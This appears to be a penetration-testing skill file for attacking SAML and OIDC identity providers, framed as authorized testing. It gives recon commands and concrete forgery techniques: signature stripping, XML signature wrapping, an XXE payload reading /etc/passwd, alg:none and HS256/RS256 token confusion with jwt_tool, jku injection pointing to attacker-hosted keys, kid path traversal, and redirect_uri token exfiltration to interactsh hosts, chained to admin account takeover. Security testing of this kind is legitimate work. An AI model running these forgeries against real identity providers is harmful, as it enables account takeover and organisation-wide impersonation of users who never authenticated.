---
name: saml_oidc_idp
description: Authorized testing of SAML/OIDC identity providers — signature, audience, replay, and assertion/token tampering.
---

# SAML / OIDC Identity Provider

A SAML or OIDC identity provider (IdP) is the authentication authority that issues signed assertions (SAML) or signed tokens (OIDC/OAuth2) which downstream service providers (SPs / relying parties) trust to grant access. The attacker's objective is to forge, replay, or tamper with these proofs so the IdP or a trusting SP accepts an identity that was never legitimately authenticated — yielding account takeover, privilege escalation, or full federation compromise. Because every relying party trusts the IdP, a single signature-validation flaw can cascade across an entire organization.

## Attack Surface

**SAML endpoints**
- IdP SSO endpoint (`/saml2/idp/SSOService.php`, `/adfs/ls/`, `/sso/saml`), SLO endpoint, ACS (Assertion Consumer Service) on the SP side.
- Metadata: `/saml/metadata`, `/FederationMetadata/2007-06/FederationMetadata.xml`, `/simplesaml/saml2/idp/metadata.php` — exposes signing certs, endpoints, NameID format.
- `SAMLRequest` / `SAMLResponse` / `RelayState` params (HTTP-Redirect = deflated+base64+URL-encoded; HTTP-POST = base64 form field).

**OIDC / OAuth2 endpoints**
- Discovery: `/.well-known/openid-configuration`, JWKS at `jwks_uri`.
- `/authorize`, `/token`, `/userinfo`, `/introspect`, `/revoke`, dynamic client registration `/register`.
- ID tokens (JWT) and access tokens; `redirect_uri`, `state`, `nonce`, `code`, `code_challenge` (PKCE), `response_type`, `scope`, `prompt`.

**What is exposed**
- Public signing keys/certs (verify, never trust as authz boundary), supported algorithms, NameID/claim formats, registered SPs/clients, and any self-service registration.

## Recon & Enumeration

```bash
# Live host / TLS / tech fingerprint
naabu -host idp.target.tld -p 443,8443,80,8080 -silent | httpx -title -tech-detect -tls-probe -status-code
wafw00f https://idp.target.tld

# OIDC discovery + JWKS (the single richest recon artifact)
curl -s https://idp.target.tld/.well-known/openid-configuration | jq .
curl -s "$(curl -s https://idp.target.tld/.well-known/openid-configuration | jq -r .jwks_uri)" | jq .

# SAML metadata
curl -s https://idp.target.tld/FederationMetadata/2007-06/FederationMetadata.xml -o md.xml
curl -s https://idp.target.tld/simplesaml/saml2/idp/metadata.php -o md.xml
xmllint --format md.xml | grep -iE "X509Certificate|SingleSignOn|NameIDFormat|WantAuthnRequestsSigned"

# Subdomains / federation siblings (adfs, sts, login, sso, idp, auth)
subfinder -d target.tld -silent | httpx -silent -match-string "openid-configuration|saml|wsfed"
dnsx -d target.tld -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -silent

# Endpoint / path discovery
ffuf -u https://idp.target.tld/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,302,401,403
katana -u https://idp.target.tld -d 3 -jc -silent

# Known IdP CVEs & misconfig (Keycloak, ADFS, SimpleSAMLphp, Shibboleth, OneLogin, Okta)
nuclei -u https://idp.target.tld -tags saml,oauth,oidc,keycloak,adfs,jwt -s critical,high,medium -silent -j -o idp_nuclei.jsonl

# JWT / token tooling (preinstalled; else: pip install jwt_tool  OR  git clone https://github.com/ticarpi/jwt_tool)
jwt_tool <ID_TOKEN>                 # decode + claim audit
jwt_tool <ID_TOKEN> -t https://idp.target.tld/.well-known/openid-configuration  # auto JWKS pull

# SAML manipulation (Burp + SAML Raider extension) or python:
pip install python3-saml lxml signxml      # for crafting/re-signing assertions
# decode a SAMLResponse param quickly:
python3 -c "import sys,base64,urllib.parse,zlib;print(base64.b64decode(urllib.parse.unquote(sys.argv[1])).decode())" "$SAMLRESPONSE"

# Leaked signing keys / secrets in repos and artifacts
trufflehog filesystem ./idp-config --only-verified
gitleaks detect --source ./idp-config
semgrep --config p/jwt --config p/secrets ./idp-config
```

## Methodology

1. **Map the protocol(s).** Confirm SAML, OIDC, or WS-Fed. Pull metadata/discovery and the JWKS/X509 signing certs. Note advertised algorithms (`RS256`, `HS256`, `none`, `ES256`) and `NameIDFormat`/claim shapes.
2. **Capture a legitimate flow.** Proxy a real login through Burp end to end. Save a valid `SAMLResponse`/`Assertion` or ID token/access token as the baseline for tampering.
3. **Audit signature validation.** This is the core test — see Key Weaknesses. Try unsigned, stripped-signature, wrong-key, and algorithm-confusion variants and observe whether the SP/IdP still accepts the identity.
4. **Tamper claims/attributes.** Modify `NameID`, `email`, `groups`/`roles`, `sub`, `aud`, `iss` and re-submit; check if authz is derived from attacker-controlled fields.
5. **Test temporal & replay controls.** Replay a previously consumed assertion/token; modify/remove `NotOnOrAfter`, `exp`, `iat`, `nonce`, `jti`.
6. **Test redirect/relay handling.** Probe `redirect_uri`, `RelayState`, `wreply` for open redirect and token exfiltration.
7. **Test the OAuth2 surface.** Code interception, PKCE downgrade, `state`/`nonce` absence (CSRF), implicit-flow leakage, client-secret exposure, scope/consent bypass.
8. **Chain to impact.** Convert a forged identity into SP account takeover, admin role injection, or cross-tenant access.

## Key Weaknesses / Techniques

### SAML signature flaws
- **No signature validation / signature stripping.** Remove `<ds:Signature>` entirely (or the assertion-level one) and resubmit. Many SPs verify only if a signature is present.
- **XML Signature Wrapping (XSW).** Inject a second forged `<Assertion>` while keeping the original signed one so the signature verifies against the legit assertion but the processor reads the forged one. Use Burp **SAML Raider** XSW templates 1–8, or craft manually by relocating the signed element and adding an attacker assertion with an attacker `NameID`.
- **Comment injection in NameID.** `admin@target.tld` vs `admin@target.tld<!---->.evil.tld` — XML canonicalizers may strip comments differently from the text extractor, letting you impersonate `admin@target.tld`.
- **Certificate / key confusion.** Resign the assertion with your own key and supply your own `<X509Certificate>` inline; vulnerable SPs trust the embedded cert instead of pinned metadata.
- **XXE in the SAML parser.** Inject `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` into the unsigned envelope; if reflected/erroring, escalate to SSRF/file read (use `interactsh-client` for blind OOB).

```bash
# Re-sign a tampered assertion with python3-saml/signxml after editing NameID/attributes,
# then base64+URL-encode and replay to the ACS. Decode/edit baseline first:
python3 -c "import base64;open('assn.xml','wb').write(base64.b64decode(open('resp.b64').read()))"
xmllint --format assn.xml        # edit NameID/Attribute, then re-encode and POST to ACS
```

### OIDC / JWT flaws
- **`alg: none`.** Strip the signature and set header `{"alg":"none"}`: `jwt_tool <token> -X a`.
- **HS256/RS256 confusion.** Re-sign an RS256 token with HS256 using the public key as the HMAC secret: `jwt_tool <token> -X k -pk pubkey.pem`. Works when the verifier keys off the token's own `alg`.
- **JWKS injection (`jku`/`x5u`/`jwk`).** Point header `jku`/`x5u` to an attacker-hosted key set, or embed a `jwk`, and sign with your matching private key: `jwt_tool <token> -X i` / `-X s`. Validate any host allowlist on `jku`.
- **`kid` injection.** SQLi/path-traversal/command-injection via the `kid` header to load an attacker-known key (e.g. `kid` -> `../../dev/null`, empty key).
- **Audience / issuer confusion.** Replay a token minted for client A at client B's relying party when `aud`/`azp` isn't strictly checked; cross-tenant when `iss` is loosely matched.
- **Claim tampering.** Flip `email_verified`, escalate `groups`/`roles`/`scope`, change `sub` — confirm whether the verified signature actually covers the field driving authz.

### OAuth2 flow flaws
- **`redirect_uri` validation.** Test substring/prefix matches, path append (`/callback/../evil`), `@` host confusion, open-redirect chaining, and `localhost`/wildcard registration to exfiltrate `code`/token.
- **Missing `state` -> login CSRF; missing/ignored `nonce` -> ID-token replay.**
- **PKCE downgrade.** Omit `code_challenge` or send `code_challenge_method=plain` and check enforcement; replay authorization `code` (should be single-use).
- **Dynamic client registration abuse.** If `/register` is open, register a client with an attacker `redirect_uri` or request privileged scopes.

## Validation

- **SAML forgery proof:** submit the tampered/XSW/unsigned assertion to the ACS and demonstrate an authenticated session as a different (or higher-privileged) principal — capture the resulting session cookie and an authenticated page. Compare against the rejected control (e.g. random-byte signature) to prove validation is actually bypassed, not absent.
- **JWT forgery proof:** present the forged token to `/userinfo` or a protected SP API and show a 200 with the impersonated `sub`/claims; show the same token with a flipped signature is rejected to confirm the server trusted your forgery.
- **Replay proof:** consume an assertion/token once, then resend the identical artifact and show it is accepted a second time (or after `NotOnOrAfter`/`exp`).
- **Redirect/leak proof:** drive a full auth request whose `code`/token lands on an attacker-controlled `redirect_uri` (use an `interactsh-client` URL to capture the inbound request).
- Always keep a clean control request to distinguish a real bypass from an endpoint that accepts everything (or nothing).

## False Positives

- Decoding/modifying a token client-side without the SP accepting it — tampering is only a finding when the **server** honors it.
- `alg:none` "accepted" by a permissive decoder library in your test harness, not by the target's verifier.
- Metadata/JWKS/cert exposure: public signing keys are meant to be public; not a vuln unless a **private** key or shared secret leaks.
- XSW that the SP rejects (proper schema validation + signed-element reference resolution).
- Expired/short-lived tokens that "work" only inside the legitimate validity window — that is correct behavior, not replay.
- `redirect_uri` reflections that never actually deliver a `code`/token to the foreign host.
- Self-signed cert / TLS warnings on an internal IdP that are accepted policy.

## Chaining & Impact

- Signature bypass / XSW -> forge `NameID=admin` -> **SP admin account takeover**, then pivot into every app federated to that IdP.
- JWT `alg`/`jku` confusion -> mint arbitrary ID tokens -> **full IdP impersonation** across all relying parties.
- Group/role/scope claim injection -> **privilege escalation** inside the SP (e.g. `groups: ["Domain Admins"]`).
- `aud`/`iss` confusion -> **cross-tenant / cross-application** access in multi-tenant IdPs (Keycloak realms, Azure AD app registrations).
- Open `redirect_uri` + implicit/code leak -> **token theft** -> chained to the above forgeries.
- SAML XXE -> SSRF -> cloud metadata creds (chain into the SSRF playbook) -> infrastructure compromise.
- Leaked IdP signing key (trufflehog/gitleaks) -> offline forgery of any assertion/token -> persistent, undetectable impersonation.

## Pro Tips

1. Always compare against a control with a deliberately broken signature — an endpoint that accepts both your forgery and pure garbage is broken differently (no validation) than one that accepts only the forgery (validation logic flaw); both matter but the PoC framing differs.
2. SAML signatures can sit at message level, assertion level, or both — strip/wrap each independently; SPs frequently validate one and read the other.
3. For HS256/RS256 confusion, the exact PEM matters: try the cert with and without headers, with trailing newline variants — verifiers are picky and a false negative hides a real bug.
4. Deflated SAML (HTTP-Redirect binding) is raw-deflate, not zlib — use `zlib.decompress(data, -15)` or you will get garbage and assume the endpoint is broken.
5. `email_verified=false` is the silent killer: many SPs match accounts on `email` but forget to require it be verified, enabling pre-account-takeover via attacker-controlled OIDC claims.
6. Check whether `jku`/`x5u` allowlisting is host-exact or substring — `https://idp.target.tld.evil.tld/jwks` defeats naive prefix checks.
7. Test SLO/logout for assertion injection too; it is the same parser with weaker scrutiny.
8. Keycloak/ADFS/SimpleSAMLphp versions in metadata/headers map directly to public CVEs — fingerprint precisely before crafting, and run the matching `nuclei` tags first.
9. Use a fresh `interactsh-client` domain per payload for `jku`/redirect/XXE OOB so you can attribute each callback to a specific request.
